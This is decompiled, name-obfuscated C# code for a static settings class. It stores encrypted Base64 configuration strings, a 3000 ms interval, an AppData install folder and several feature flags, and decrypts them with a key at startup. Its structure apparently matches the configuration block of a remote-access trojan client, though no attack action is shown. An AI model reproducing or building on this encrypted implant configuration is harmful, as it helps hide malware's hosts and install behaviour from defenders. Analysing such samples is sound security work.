using System;

public static class GClass0
{
	public static string string_0 = "DpMTX5fa/9HjtnJAD6fAsUJPNAaXngWCO0POviCOaiBNhZaBAWCEMYFg1Y3SGlpGzv3383NsvRWliePlW2Ug4Q==";

	public static string string_1 = "dVeQAEW0KqknChdO9ylKiqqsPljUG78fgM7ApBaGXd9KfMaDb15xTe4bPz0bsvDLvCAxBkd2MoluZKBo2nV3FELwELfxH3P10mwl/C2w6PQJvwbP3Dcn7TXBJKTNgkTfCgzRZ4Sc/+DEDmQj+G2hulULBzWUF/zEcyuKvi/bAVeAu19Q96Ka9YCxzdkQMYU4a3XSbMnVrZ96Q7PYaaeyfuhEszdllrWhS8QnI5YQgHBRtfNk/6Sgin/YMJ40jT8n6nyLXDVMQpRRXRi4Itv+dFisfKVNa0QgpZQkM2mA3wP7fp6dJrRyoU/QSrrXRolvMmZdAoLytU34b9XtdaSSftqUk+SxyDdaFHq8m9SRBEeTjlkBu1EOVLbUvro48XUpZmIeELcVXZZD2GEisiOHTptXJ4WWEBqTHPk1TT7H8qlrMLDNmc9Q88caijcbcVVyDXOpIPYbRcVmD2aO/Su6bwstj+aGpdp7Ql50TI/1sq+fZ5UNXFZGa7YTIqWey4di";

	public static int int_0 = 3000;

	public static string string_2 = "tIkdyP7EozgTzlJFIAEO4g==";

	public static string string_3 = "xNbKtQSmKe+29RfU4dc3een1ZSXnsJC9+J7k9GDu0YvEPVYjSPSKB0b/i5bnBlyaEOJXgCLjHtIGsZ+p6d9rqg==";

	public static Environment.SpecialFolder specialFolder_0 = Environment.SpecialFolder.ApplicationData;

	public static string string_4 = Environment.GetFolderPath(specialFolder_0);

	public static string string_5 = "rs4RBEBTZu6gJHx5RBr9iW66mi2hKeNERL795XqDmJIs7UyYYtC1tBiV0o3i2de34ZQWnidz/R6nVu6VGPpgUA==";

	public static string string_6 = "DgCNX93/Y34IDwc4pAC+oX7IcdcBilwHJ2/abGCIDaGOkQWpbOWlVEfG0KyYvxbbp23/9hTWEtzimJ5Gd3TZbQ==";

	public static bool bool_0 = true;

	public static bool bool_1 = true;

	public static string string_7 = "IB7pz6jAZYyOELnGdtunZv6OUDWXkXvqPiwaXJfVJqINKkjPrH66/CcRlFRNzfGIXTM2Mu4TxF1Pi8rzwfdtEpNRKVuSXkAuJ18jEhny4Ow=";

	public static string string_8 = "rmiLoeVfcaboCIyXVs3PChurYfPSlICf0StMoeC+TLE6AsARec2pskXwp30MPFn44HIyOYPeEyhGjQ1FN1Xhgg==";

	public static bool bool_2 = true;

	public static bool bool_3 = true;

	public static string string_9 = "8IrJrxPGhU4I7s9Zh1RF";

	public static string string_10 = "AZIHvP+pUUMAMTBy0rdstHW/GhdIlWmhT8cdUjpYD6zkpPvSzj+LEcuO1jKFmuFCwyOY/t3PXFX1scMFaFDPjQ==";

	public static string string_11 = "6gGnhoIfRx/qbTUH5YxrPMPQZncglXNwyHKEv6uzD78x33kEtcOHX4mUT3R4iwcbbfT6gL8Ub1d9TFzbIA2gog==";

	public static bool bool_4 = true;

	public static bool bool_5 = true;

	public static bool smethod_0()
	{
		if (string.IsNullOrEmpty(string_0))
		{
			return false;
		}
		GClass30.smethod_0(string_9);
		string_10 = GClass30.smethod_6(string_10);
		string_0 = GClass30.smethod_6(string_0);
		string_1 = GClass30.smethod_6(string_1);
		string_5 = GClass30.smethod_6(string_5);
		string_6 = GClass30.smethod_6(string_6);
		string_7 = GClass30.smethod_6(string_7);
		string_8 = GClass30.smethod_6(string_8);
		string_11 = GClass30.smethod_6(string_11);
		smethod_1();
		return true;
	}

	private static void smethod_1()
	{
		if (!GClass46.Is64Bit)
		{
			switch (specialFolder_0)
			{
			case Environment.SpecialFolder.ProgramFilesX86:
				specialFolder_0 = Environment.SpecialFolder.ProgramFiles;
				break;
			case Environment.SpecialFolder.SystemX86:
				specialFolder_0 = Environment.SpecialFolder.System;
				break;
			}
			string_4 = Environment.GetFolderPath(specialFolder_0);
		}
	}
}
